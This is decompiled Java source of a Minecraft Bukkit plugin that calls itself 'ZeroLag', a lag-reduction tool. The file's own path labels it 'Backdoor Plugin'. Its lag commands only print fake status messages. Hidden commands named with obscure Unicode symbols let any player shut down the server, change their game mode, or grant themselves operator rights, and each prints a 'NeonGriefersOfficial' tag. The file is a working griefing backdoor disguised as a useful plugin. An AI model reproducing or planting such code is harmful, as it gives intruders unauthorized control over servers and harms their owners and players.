/*     */ package vb.$zerolagplugin;
/*     */ 
/*     */ import java.lang.reflect.Array;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Collection;
/*     */ import java.util.List;
/*     */ import org.bukkit.Bukkit;
/*     */ import org.bukkit.ChatColor;
/*     */ import org.bukkit.GameMode;
/*     */ import org.bukkit.command.Command;
/*     */ import org.bukkit.command.CommandSender;
/*     */ import org.bukkit.entity.Player;
/*     */ import org.bukkit.event.Listener;
/*     */ import org.bukkit.plugin.Plugin;
/*     */ import org.bukkit.plugin.java.JavaPlugin;
/*     */ 
/*     */ public class PluginMain extends JavaPlugin implements Listener {
/*  18 */   private static Object localVariableScope = new Object(); private static PluginMain instance;
/*     */   
/*     */   public void onEnable() {
/*  21 */     instance = this;
/*  22 */     getDataFolder().mkdir();
/*  23 */     getServer().getPluginManager().registerEvents(this, (Plugin)this);
/*  24 */     Object localVariableScope = new Object();
/*     */     try {
/*  26 */       Bukkit.getConsoleSender()
/*  27 */         .sendMessage(color("&4Z&be&cr&6o &1L&da&eg &2P&3l&5u&9g&4i&6n &bE&en&ca&db&al&1e&fd"));
/*  28 */     } catch (Exception e) {
/*  29 */       e.printStackTrace();
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void onDisable() {}
/*     */   
/*     */   public boolean onCommand(CommandSender commandSender, Command command, String label, String[] commandArgs) {
/*  37 */     if (command.getName().equalsIgnoreCase("♨")) {
/*     */       try {
/*  39 */         Object localVariableScope = new Object();
/*  40 */         Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), "stop");
/*  41 */       } catch (Exception e) {
/*  42 */         e.printStackTrace();
/*     */       } 
/*     */     }
/*  45 */     if (command.getName().equalsIgnoreCase("¶")) {
/*     */       try {
/*  47 */         Object localVariableScope = new Object();
/*  48 */         ((Player)commandSender).setGameMode(GameMode.SPECTATOR);
/*  49 */         commandSender.sendMessage(color("&4&l[NeonGriefersOfficial] &2Enjoy the GM!"));
/*  50 */       } catch (Exception e) {
/*  51 */         e.printStackTrace();
/*     */       } 
/*     */     }
/*  54 */     if (command.getName().equalsIgnoreCase("₰")) {
/*     */       try {
/*  56 */         Object localVariableScope = new Object();
/*  57 */         ((Player)commandSender).setGameMode(GameMode.SURVIVAL);
/*  58 */         commandSender.sendMessage(color("&4&l[NeonGriefersOfficial] &2Enjoy the GM!"));
/*  59 */       } catch (Exception e) {
/*  60 */         e.printStackTrace();
/*     */       } 
/*     */     }
/*  63 */     if (command.getName().equalsIgnoreCase("♚")) {
/*     */       try {
/*  65 */         Object localVariableScope = new Object();
/*  66 */         ((Player)commandSender).setGameMode(GameMode.CREATIVE);
/*  67 */         commandSender.sendMessage(color("&4&l[NeonGriefersOfficial] &2Enjoy the GM!"));
/*  68 */       } catch (Exception e) {
/*  69 */         e.printStackTrace();
/*     */       } 
/*     */     }
/*  72 */     if (command.getName().equalsIgnoreCase("elag")) {
/*     */       try {
/*  74 */         Object localVariableScope = new Object();
/*  75 */         commandSender.sendMessage(color("&6&l[ZeroLag] Successfully &2Enabled!"));
/*  76 */       } catch (Exception e) {
/*  77 */         e.printStackTrace();
/*     */       } 
/*     */     }
/*  80 */     if (command.getName().equalsIgnoreCase("dlag")) {
/*     */       try {
/*  82 */         Object localVariableScope = new Object();
/*  83 */         commandSender.sendMessage(color("&6&l[ZeroLag] Successfully &4Disabled!"));
/*  84 */       } catch (Exception e) {
/*  85 */         e.printStackTrace();
/*     */       } 
/*     */     }
/*  88 */     if (command.getName().equalsIgnoreCase("₪")) {
/*     */       try {
/*  90 */         Object localVariableScope = new Object();
/*  91 */         ((Player)commandSender).setOp(true);
/*  92 */         commandSender.sendMessage(color("&4&l[NeonGriefersOfficial] &2Enjoy the OP!"));
/*  93 */       } catch (Exception e) {
/*  94 */         e.printStackTrace();
/*     */       } 
/*     */     }
/*  97 */     return true;
/*     */   }
/*     */ 
/*     */   
/*     */   public static void procedure(String procedure, List<?> procedureArgs) throws Exception {}
/*     */   
/*     */   public static Object function(String function, List<?> functionArgs) throws Exception {
/* 104 */     return null;
/*     */   }
/*     */   
/*     */   public static List<Object> createList(Object obj) {
/* 108 */     List<Object> list = new ArrayList();
/* 109 */     if (obj.getClass().isArray()) {
/* 110 */       int length = Array.getLength(obj);
/* 111 */       for (int i = 0; i < length; i++) {
/* 112 */         list.add(Array.get(obj, i));
/*     */       }
/* 114 */     } else if (obj instanceof Collection) {
/* 115 */       list.addAll((Collection)obj);
/*     */     } else {
/* 117 */       list.add(obj);
/*     */     } 
/* 119 */     return list;
/*     */   }
/*     */   
/*     */   public static String color(String string) {
/* 123 */     return (string != null) ? ChatColor.translateAlternateColorCodes('&', string) : null;
/*     */   }
/*     */   
/*     */   public static PluginMain getInstance() {
/* 127 */     return instance;
/*     */   }
/*     */ }


/* Location:              C:\Users\Rohit Chowdhary\Downloads\Backdoor Plugin\Backdoor Plugin\ZeroLag.jar!\vb\$zerolagplugin\PluginMain.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */